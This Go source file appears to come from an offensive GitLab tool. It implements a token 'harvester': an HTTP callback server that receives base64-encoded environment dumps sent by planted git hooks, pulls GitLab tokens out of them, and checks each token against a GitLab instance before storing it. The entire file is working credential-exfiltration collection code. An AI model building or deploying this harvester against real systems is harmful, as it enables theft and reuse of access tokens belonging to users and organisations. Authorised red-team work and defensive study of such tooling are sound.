package pivot

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
)

// HarvestEvent reports harvester progress to callers.
type HarvestEvent struct {
	Type    string // "listening", "callback", "credential", "error"
	Message string
	Detail  any
}

// HarvestResult captures the outcome of a harvest session.
type HarvestResult struct {
	Credentials []*Credential `json:"credentials"`
	Callbacks   int           `json:"callbacks_received"`
	Duration    time.Duration `json:"duration_ms"`
}

// HarvestOptions configures the token harvest mode.
type HarvestOptions struct {
	ListenAddr    string        // HTTP listen address (default ":9443")
	GitLabURL     string        // GitLab URL for token validation
	Timeout       time.Duration // max wait time (default 30m)
	ClientOptions []gitlabx.Option
	Progress      func(HarvestEvent)
}

func (o *HarvestOptions) defaults() {
	if o.ListenAddr == "" {
		o.ListenAddr = DefaultListenAddr
	}
	if o.Timeout <= 0 {
		o.Timeout = 30 * time.Minute
	}
}

// Harvester passively listens for git hook callbacks containing env vars,
// extracts GitLab tokens, and validates them.
type Harvester struct {
	opts      HarvestOptions
	creds     *CredentialStore
	mu        sync.Mutex
	callbacks int
	srv       *http.Server
	addr      string // actual listen address (set after Start)
}

// NewHarvester creates a token harvester.
func NewHarvester(opts HarvestOptions) *Harvester {
	opts.defaults()
	return &Harvester{
		opts:  opts,
		creds: NewCredentialStore(),
	}
}

// Run starts the callback server and blocks until timeout or context cancellation.
// Returns harvested credentials.
func (h *Harvester) Run(ctx context.Context) (*HarvestResult, error) {
	start := time.Now()
	ctx, cancel := context.WithTimeout(ctx, h.opts.Timeout)
	defer cancel()

	mux := http.NewServeMux()
	mux.HandleFunc("/", h.handleCallback)

	h.srv = &http.Server{
		Addr:              h.opts.ListenAddr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       15 * time.Second,
		IdleTimeout:       60 * time.Second,
		BaseContext:       func(_ net.Listener) context.Context { return ctx },
	}

	ln, err := net.Listen("tcp", h.opts.ListenAddr)
	if err != nil {
		return nil, fmt.Errorf("listen %s: %w", h.opts.ListenAddr, err)
	}
	h.mu.Lock()
	h.addr = ln.Addr().String()
	h.mu.Unlock()
	h.emit(HarvestEvent{Type: "listening", Message: fmt.Sprintf("callback server listening on %s", h.addr)})

	go func() { //nolint:gosec // G118: shutdown context intentionally outlives parent
		<-ctx.Done()
		shutCtx, shutCancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer shutCancel()
		_ = h.srv.Shutdown(shutCtx)
	}()

	if err := h.srv.Serve(ln); err != nil && err != http.ErrServerClosed {
		return nil, err
	}

	h.mu.Lock()
	callbacks := h.callbacks
	h.mu.Unlock()

	return &HarvestResult{
		Credentials: h.creds.All(),
		Callbacks:   callbacks,
		Duration:    time.Since(start),
	}, nil
}

// Stop shuts down the harvester.
func (h *Harvester) Stop(ctx context.Context) error {
	if h.srv == nil {
		return nil
	}
	return h.srv.Shutdown(ctx)
}

// Addr returns the actual listen address (available after Run starts).
func (h *Harvester) Addr() string {
	h.mu.Lock()
	defer h.mu.Unlock()
	return h.addr
}

// Credentials returns the credential store.
func (h *Harvester) Credentials() *CredentialStore {
	return h.creds
}

func (h *Harvester) handleCallback(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, maxCallbackBody+1))
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if len(body) > maxCallbackBody {
		http.Error(w, "request body too large", http.StatusRequestEntityTooLarge)
		return
	}
	if len(body) == 0 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	h.mu.Lock()
	h.callbacks++
	h.mu.Unlock()

	h.emit(HarvestEvent{Type: "callback", Message: fmt.Sprintf("received callback from %s (%d bytes)", r.RemoteAddr, len(body))})

	// Decode base64 body → env var lines
	envVars, err := parseEnvDump(string(body))
	if err != nil {
		h.emit(HarvestEvent{Type: "error", Message: fmt.Sprintf("decode callback: %v", err)})
		http.Error(w, "decode failed", http.StatusBadRequest)
		return
	}

	// Extract and validate tokens
	tokens := ExtractTokens(envVars)
	for i := range tokens {
		tok := &tokens[i]
		if h.creds.Has(tok.TokenHash) {
			continue
		}
		if h.opts.GitLabURL != "" {
			validated, verr := ValidateToken(r.Context(), h.opts.GitLabURL, tok.Token, h.opts.ClientOptions...)
			if verr == nil {
				validated.SourceKey = tok.SourceKey
				tok = validated
			}
		}
		h.creds.Add(tok)
		status := "unvalidated"
		if tok.IsValid {
			status = fmt.Sprintf("valid (user: %s)", tok.Username)
		}
		h.emit(HarvestEvent{Type: "credential", Message: fmt.Sprintf("harvested %s token from %s — %s", tok.TokenType, tok.SourceKey, status)})
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, `{"status":"ok"}`)
}

// parseEnvDump decodes a base64-encoded printenv output into a key=value map.
func parseEnvDump(data string) (map[string]string, error) {
	data = strings.TrimSpace(data)
	raw, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		raw, err = base64.RawStdEncoding.DecodeString(data)
		if err != nil {
			return nil, fmt.Errorf("base64 decode: %w", err)
		}
	}

	envVars := make(map[string]string)
	scanner := bufio.NewScanner(strings.NewReader(string(raw)))
	scanner.Buffer(make([]byte, 64*1024), maxCallbackBody)
	for scanner.Scan() {
		line := scanner.Text()
		idx := strings.IndexByte(line, '=')
		if idx <= 0 {
			continue
		}
		key := line[:idx]
		value := line[idx+1:]
		envVars[key] = value
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("scan env dump: %w", err)
	}
	return envVars, nil
}

func (h *Harvester) emit(event HarvestEvent) {
	if h.opts.Progress != nil {
		h.opts.Progress(event)
	}
}
